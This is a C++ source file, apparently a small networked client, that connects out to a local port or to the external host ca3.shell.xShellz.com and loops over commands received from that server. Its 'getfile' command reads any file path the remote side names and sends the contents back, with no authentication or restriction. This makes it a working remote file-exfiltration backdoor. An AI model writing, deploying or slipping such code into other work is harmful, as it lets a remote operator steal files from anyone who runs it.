#include <standalone_asio.hpp>
#include <async_message.hpp>
#include <iostream>
#include <cstring>
#include <fstream>


using namespace asio::ip;

std::size_t get_file_size(const std::string& file_name)
{
    std::ifstream file(file_name, std::ios::binary | std::ios::ate);
    return file.tellg();
}

async_message::shared_ptr read_message(tcp::socket& socket, asio::strand& output_strand)
{
    async_message::shared_ptr async_message = async_message::make_shared(output_strand);
    asio::read(socket, asio::buffer(async_message->data(), async_message::header_length));
    async_message->decode_header();
    asio::read(socket, asio::buffer(async_message->body(), async_message->body_length()));

    std::cout << "message size: " << async_message->body_length() << "\n";
    std::cout.write(async_message->body(), async_message->body_length());
    std::cout << "\n";

    return async_message;
}

void get_file(tcp::socket& socket, asio::strand& output_strand)
{
    using asio::detail::socket_ops::host_to_network_long;
    auto file_name_message = read_message(socket, output_strand);
    std::string file_name(file_name_message->body(), file_name_message->body() + file_name_message->body_length());
    std::fstream file(file_name, std::ios::in | std::ios::binary);
    uint32_t file_size = get_file_size(file_name);
    if (!file.is_open())
    {
        std::cout << "Can't find file\n";
        file_size = 0;
        return;
    }
    file_size = host_to_network_long(file_size);
    async_message::shared_ptr async_message = async_message::make_shared(output_strand);
    std::memcpy(async_message->body(), &file_size, sizeof(uint32_t));
    async_message->set_body_length(sizeof(uint32_t));
    async_message->encode_header();
    asio::write(socket, asio::buffer(async_message->data(), async_message->length()));
    while (std::size_t bytes_read = file.readsome(async_message->body(), async_message::max_body_length))
    {
        async_message->set_body_length(bytes_read);
        async_message->encode_header();
        asio::write(socket, asio::buffer(async_message->data(), async_message->length()));
        std::cout << "loop";
    }
}

void ping(tcp::socket& socket, asio::strand& output_strand)
{
     async_message::shared_ptr async_message = async_message::make_shared("PONG RECEIVED!", output_strand);
     asio::write(socket, asio::buffer(async_message->data(), async_message->length()));
     asio::write(socket, asio::buffer(async_message->data(), async_message->length()));
}

void execute(tcp::socket& socket, asio::strand& output_strand)
{
    auto async_message = read_message(socket, output_strand);
    if (!std::memcmp(async_message->body(), "ping", 4))
        ping(socket, output_strand);
    if (!std::memcmp(async_message->body(), "getfile", 7))
        get_file(socket, output_strand);
}

void client()
{
    asio::io_service io;
    tcp::endpoint ep(address::from_string("127.0.0.1"), 22334);
    tcp::socket socket(io);
    socket.connect(ep);
    asio::strand output_strand(io);
    for (;;)
    {
        execute(socket, output_strand);
    }
}

void remote_client()
{
    asio::io_service io_service;
    tcp::resolver resolver(io_service);
    tcp::resolver::query query("ca3.shell.xShellz.com", "22334");
    tcp::resolver::iterator endpoint_iterator = resolver.resolve(query);
    tcp::socket socket(io_service);
    asio::connect(socket, endpoint_iterator);
    asio::strand output_strand(io_service);
    for (;;)
    {
        execute(socket, output_strand);
    }
}